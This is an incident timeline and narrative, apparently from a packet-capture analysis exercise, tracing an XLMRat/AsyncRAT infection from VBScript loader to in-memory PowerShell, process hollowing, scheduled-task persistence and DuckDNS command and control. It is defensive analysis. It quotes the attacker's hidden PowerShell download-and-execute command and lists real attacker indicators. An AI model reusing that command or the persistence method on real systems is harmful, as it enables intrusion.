# Incident Timeline — XLMRat / AsyncRAT

All times UTC, from `236-XLMRat.pcap` (frame numbers in brackets). Capture
starts 2024-01-09 17:27:27 and spans ~766 s.

| Time (UTC) | Frame | Event | Technique (ATT&CK) |
|---|---|---|---|
| 17:27:27.576 | 1 | Victim `10.1.9.101` opens TCP to `45.126.209.4:222` | T1071 |
| 17:27:27.871 | 4 | `GET /xlm.txt` — **stage-1 download** (VBScript loader) | T1105 |
| 17:27:28.140 | 6 | Server returns `200 OK` `text/plain` (1,974 B VBScript) | — |
| ~17:27:28 | — | VBScript runs `cmd /c powershell -NOP -W Hidden -Exec Bypass -NonI IEX(...DownloadString('…/mdm.jpg'))` | T1059.005, T1059.001 |
| 17:27:29.161 | 12 | `GET /mdm.jpg` — **stage-2 download** (PowerShell, masqueraded) | T1105, T1036 |
| 17:27:29.489 | 14 | Server returns `200 OK` `image/jpeg` (431,208 B PowerShell) | — |
| ~17:27:29 | — | PowerShell reconstructs two PEs from hex; `Reflection.Assembly::Load` → `NewPE2.PE.Execute` | T1620, T1055.012 |
| ~17:27:29 | — | AsyncRAT hollowed into `RegSvcs.exe` (LOLBin) | T1218 |
| ~17:27:29 | — | Drops `Conted.ps1/.bat/.vbs` to `C:\Users\Public\`; registers scheduled task **"Update Edge"** | T1053.005 |
| 17:29:48.927 | 350 | Victim resolves `madmrx.duckdns.org` (DuckDNS C2) | T1568.002 |
| 17:27→17:40 | 15–1550 | Sustained AsyncRAT C2 over `45.126.209.4:8808` (1,199 pkts) | T1571, T1219 |

## Narrative

1. **Delivery & stage 1.** The endpoint retrieves `xlm.txt`, a small VBScript, from
   the attacker's server on the unusual port 222. The VBScript is heavily
   string-obfuscated (array of 2-char fragments reassembled at runtime).
2. **Stage 2.** The VBScript launches a hidden PowerShell that downloads
   `mdm.jpg` — served as `image/jpeg` but actually a 431 KB PowerShell script.
3. **In-memory execution.** The script carries two .NET executables encoded as
   underscore-separated hex: a **NewPE2 RunPE loader** and the **AsyncRAT client**.
   It reflectively loads the loader and calls `Execute` to hollow the payload into
   the signed .NET utility `RegSvcs.exe`.
4. **Persistence.** Three `Conted.*` files are dropped to `C:\Users\Public\` and a
   scheduled task **"Update Edge"** relaunches them on a schedule.
5. **Command & control.** The implant resolves the DuckDNS name `madmrx.duckdns.org`
   and maintains an AsyncRAT channel to `45.126.209.4:8808`.
